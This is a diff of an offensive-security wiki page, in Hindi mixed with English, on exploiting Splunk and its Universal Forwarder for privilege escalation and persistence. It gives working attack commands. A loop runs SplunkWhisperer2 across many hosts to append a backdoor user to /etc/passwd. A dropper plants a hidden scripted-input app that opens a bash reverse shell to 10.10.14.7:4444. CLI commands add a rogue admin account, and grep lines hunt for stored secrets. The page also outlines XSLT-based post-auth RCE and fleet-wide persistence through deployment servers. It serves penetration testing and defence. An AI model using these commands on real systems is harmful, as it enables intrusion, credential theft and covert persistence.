@@ -1,50 +1,161 @@
-# Splunk LPE और स्थिरता
+# Splunk LPE and Persistence
 
 {{#include ../../banners/hacktricks-training.md}}
 
-यदि **आंतरिक** या **बाहरी** रूप से किसी मशीन का **गणना** करते समय आपको **Splunk चलाते हुए** (पोर्ट 8090) मिलता है, और यदि आपको किसी **मान्य क्रेडेंशियल** का पता है, तो आप **Splunk सेवा का दुरुपयोग** करके **एक शेल** को उस उपयोगकर्ता के रूप में **निष्पादित** कर सकते हैं जो Splunk चला रहा है। यदि रूट इसे चला रहा है, तो आप रूट तक विशेषाधिकार बढ़ा सकते हैं।
+अगर आप **internally** या **externally** किसी machine का **enumerating** कर रहे हैं और आपको **Splunk running** मिलता है (आमतौर पर web UI के लिए **8000** और management API के लिए **8089**), तो valid credentials को अक्सर app installation, scripted inputs, या management actions के जरिए **code execution** में बदला जा सकता है। अगर Splunk **root** के रूप में चल रहा है, तो यह अक्सर तुरंत **privilege escalation** बन जाता है।
 
-यदि आप **पहले से ही रूट हैं और Splunk सेवा केवल लोकलहोस्ट पर नहीं सुन रही है**, तो आप Splunk सेवा से **पासवर्ड** फ़ाइल **चुरा सकते हैं** और पासवर्ड को **क्रैक** कर सकते हैं, या इसमें **नए** क्रेडेंशियल जोड़ सकते हैं। और होस्ट पर स्थिरता बनाए रख सकते हैं।
+अगर आपको सिर्फ generic remote attack surface, enumeration, या app-upload RCE path चाहिए, तो देखें:
 
-नीचे पहले चित्र में आप देख सकते हैं कि एक Splunkd वेब पृष्ठ कैसा दिखता है।
+{{#ref}}
+../../network-services-pentesting/8089-splunkd.md
+{{#endref}}
 
-## Splunk यूनिवर्सल फॉरवर्डर एजेंट एक्सप्लॉइट सारांश
+अगर आप पहले से ही **root** हैं और Splunk service सिर्फ localhost पर listening नहीं है, तो आप **Splunk password hashes** भी चुरा सकते हैं, **encrypted secrets** recover कर सकते हैं, या local रूप से या multiple forwarders पर persistence बनाए रखने के लिए एक **malicious app** push कर सकते हैं।
 
-अधिक विवरण के लिए पोस्ट देखें [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). यह केवल एक सारांश है:
+## Interesting Local Files
 
-**एक्सप्लॉइट अवलोकन:**
-एक्सप्लॉइट जो Splunk यूनिवर्सल फॉरवर्डर एजेंट (UF) को लक्षित करता है, हमलावरों को एजेंट पासवर्ड के साथ एजेंट पर चलने वाले सिस्टम पर मनमाना कोड निष्पादित करने की अनुमति देता है, जिससे पूरे नेटवर्क का समझौता हो सकता है।
+जब आप Splunk या Splunk Universal Forwarder चल रहे किसी host पर पहुँचते हैं, तो ये आमतौर पर सबसे interesting paths होते हैं:
+```bash
+export SPLUNK_HOME=/opt/splunk
+[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder
 
-**मुख्य बिंदु:**
+find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null
 
-- UF एजेंट आने वाले कनेक्शनों या कोड की प्रामाणिकता को मान्य नहीं करता है, जिससे यह अनधिकृत कोड निष्पादन के लिए संवेदनशील हो जाता है।
-- सामान्य पासवर्ड अधिग्रहण विधियों में उन्हें नेटवर्क निर्देशिकाओं, फ़ाइल शेयरों, या आंतरिक दस्तावेज़ों में ढूंढना शामिल है।
-- सफल दुरुपयोग से समझौता किए गए होस्ट पर SYSTEM या रूट स्तर की पहुंच, डेटा निकासी, और आगे के नेटवर्क में घुसपैठ हो सकती है।
+grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
+```
+महत्वपूर्ण artifacts:
 
-**एक्सप्लॉइट निष्पादन:**
+- **`$SPLUNK_HOME/etc/passwd`**: local Splunk users और password hashes.
+- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: key जिसका उपयोग Splunk कई `.conf` files में stored secrets को encrypt करने के लिए करता है।
+- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: initial admin bootstrap file; gold images और provisioning mistakes में useful. यदि `etc/passwd` पहले से मौजूद हो, तो इसे ignore किया जाता है.
+- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: जहाँ scripted inputs आमतौर पर enabled होते हैं।
+- **`$SPLUNK_HOME/etc/deployment-apps/`** या **`$SPLUNK_HOME/etc/apps/`**: persistent app छिपाने या पहले से क्या distribute हो रहा है, यह review करने के अच्छे स्थान।
 
-1. हमलावर UF एजेंट पासवर्ड प्राप्त करता है।
-2. एजेंटों को आदेश या स्क्रिप्ट भेजने के लिए Splunk API का उपयोग करता है।
-3. संभावित क्रियाओं में फ़ाइल निष्कर्षण, उपयोगकर्ता खाता हेरफेर, और सिस्टम का समझौता शामिल है।
+## Splunk Universal Forwarder Agent Exploit Summary
 
-**प्रभाव:**
+अधिक विवरण के लिए [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) देखें। यह सिर्फ एक summary है:
 
-- प्रत्येक होस्ट पर SYSTEM/रूट स्तर की अनुमतियों के साथ पूर्ण नेटवर्क समझौता।
-- पहचान से बचने के लिए लॉगिंग को अक्षम करने की संभावना।
-- बैकडोर या रैनसमवेयर की स्थापना।
+**Exploit overview:**
+Splunk Universal Forwarder (UF) को target करने वाला एक exploit attackers को **agent password** के साथ systems पर arbitrary code execute करने देता है जिन पर यह agent चल रहा है, जिससे environment का बड़ा हिस्सा potentially compromise हो सकता है।
 
-**दुरुपयोग के लिए उदाहरण आदेश:**
+**यह क्यों काम करता है:**
+
+- UF management service अक्सर **TCP 8089** पर exposed होता है।
+- Attackers API से authenticate करके forwarder को एक **malicious app bundle** install करने का निर्देश दे सकते हैं।
+- यही primitive local रूप से **LPE** या remotely **RCE** के लिए इस्तेमाल किया जा सकता है।
+- **SplunkWhisperer2** जैसे public tooling app bundle को automatically बनाते हैं और Linux targets के लिए payloads adapt कर सकते हैं।
+
+**password recover करने के सामान्य तरीके:**
+
+- documentation, scripts, shares, या deployment automation में cleartext credentials।
+- `$SPLUNK_HOME/etc/passwd` के अंदर password hashes, फिर offline cracking।
+- Golden images या provisioning leftovers जैसे `user-seed.conf`।
+
+**Impact:**
+
+- हर compromised host पर SYSTEM/root-level code execution।
+- persistent apps, backdoors, या ransomware की deployment।
+- data forwarded होने से पहले telemetry को disable करना या tamper करना।
+
+**Exploitation के लिए example command:**
 ```bash
 for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
 ```
-**उपयोगी सार्वजनिक एक्सप्लॉइट:**
+**Usable public exploits:**
 
 - [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
 - [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
 - [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)
 
-## Splunk क्वेरी का दुरुपयोग
+## Persistence via Scripted Inputs or Malicious Apps
 
-**अधिक जानकारी के लिए पोस्ट देखें [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**
+अगर आपके पास `root`/`splunk` के रूप में **filesystem write access** है, या apps install करने की authenticated access है, तो एक बहुत reliable persistence mechanism है एक **custom app** के साथ **scripted input** drop करना। Splunk की अपनी documentation उम्मीद करती है कि scripted inputs app directory के अंदर रहें और `inputs.conf` से enabled हों।
 
+Typical layout:
+```bash
+/opt/splunk/etc/apps/.linux_audit/
+├── bin/check.sh
+└── default/inputs.conf
+```
+Minimal `inputs.conf`:
+```ini
+[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
+disabled = 0
+interval = 60
+sourcetype = auditd
+```
+Quick Linux dropper:
+```bash
+APP="$SPLUNK_HOME/etc/apps/.linux_audit"
+mkdir -p "$APP/bin" "$APP/default"
+printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
+printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
+chmod +x "$APP/bin/check.sh"
+"$SPLUNK_HOME/bin/splunk" restart
+```
+Notes:
+
+- वही trick **Universal Forwarder** पर `/opt/splunkforwarder/etc/apps/` का उपयोग करके भी काम करता है।
+- Attackers अक्सर किसी स्पष्ट रूप से malicious app बनाने के बजाय एक legitimate add-on को modify करके blend in करते हैं।
+- **deployment server** पर, `deployment-apps/` के अंदर एक malicious app plant करने से यह **fleet-wide persistence** बन जाता है क्योंकि forwarders poll करते हैं, updated apps download करते हैं, और अक्सर उन्हें apply करने के लिए restart करते हैं।
+
+## Credential Theft and Admin Takeover
+
+अगर आप Splunk की local files पढ़ सकते हैं, तो आमतौर पर दो अच्छे goals होते हैं: **Splunk admin access** recover करना और **encrypted service credentials** recover करना।
+
+### Password hashes and local users
+
+Splunk local authentication data को `etc/passwd` में store करता है। Deployment के अनुसार, उस file को crack करने से web UI और management API के लिए working credentials recover हो सकते हैं।
+
+अगर आपके पास पहले से valid **admin** credentials हैं और Splunk अपना **native** authentication backend इस्तेमाल करता है, तो CLI itself persistence के लिए इस्तेमाल किया जा सकता है:
+```bash
+"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
+"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
+```
+### `splunk.secret` और encrypted values
+
+Splunk `etc/auth/splunk.secret` का उपयोग कई configuration files में stored sensitive values को protect करने के लिए करता है। अगर आप **secret** और संबंधित **`.conf` files** दोनों चुरा सकते हैं, तो आप अक्सर recover या replay कर सकते हैं:
+
+- forwarder/indexer shared secrets जैसे `pass4SymmKey`
+- TLS private-key passwords जैसे `sslPassword`
+- LDAP bind credentials जैसे `bindDNPassword`
+
+यह **lateral movement** के लिए उपयोगी है, भले ही Splunk admin password खुद crackable न हो।
+
+### `user-seed.conf` abuse
+
+`user-seed.conf` सिर्फ first start के दौरान या जब `etc/passwd` exist नहीं करता, तब consume होता है। इसलिए live box पर यह कम useful है, लेकिन इन मामलों में बहुत interesting है:
+
+- compromised installation templates
+- container images
+- unattended provisioning workflows
+- appliances जहाँ Splunk automatically reinitialized होता है
+
+इन cases में, `splunk hash-passwd` से generated `HASHED_PASSWORD` plant करने से redeployment के बाद admin access वापस पाने का एक quiet तरीका मिल जाता है।
+
+## Abusing Splunk Queries
+
+Further details के लिए [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) देखें।
+
+एक useful recent technique है vulnerable Splunk Enterprise versions में **user-supplied XSLT** को abuse करना, ताकि low-privileged authenticated account को `splunk` user के रूप में **OS command execution** में बदला जा सके।
+
+High-level flow:
+
+1. Splunk में authenticate करें।
+2. preview/upload functionality के through एक malicious **XSL** file upload करें।
+3. Splunk को **dispatch** directory से उस uploaded stylesheet के साथ search results render करने दें।
+4. XSLT payload का उपयोग करके file लिखें या Splunk की search pipeline के through execution trigger करें (for example `runshellscript` जैसी internal functionality तक पहुँचकर)।
+
+Important offensive takeaway यह है कि यह path **post-auth RCE** है, और इसमें app upload की जरूरत नहीं होती। Linux पर यह आमतौर पर आपको **`splunk`** account में पहुंचा देता है, जो फिर भी valuable है क्योंकि वह user अक्सर application tree का owner होता है, secrets पढ़ सकता है, और persistent apps plant कर सकता है जो shell loss के बाद भी survive करती हैं।
+
+Exploitation के दौरान इस्तेमाल किया गया एक representative path है:
+```text
+/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
+```
+यदि Splunk बहुत अधिक privileges के साथ चल रहा है, या यदि `splunk` user को dangerous scripts, writable service units, या खराब `sudo` rules तक access है, तो यह एक साफ **LPE** chain बन जाता है।
+
+## References
+
+- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
+- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
 {{#include ../../banners/hacktricks-training.md}}
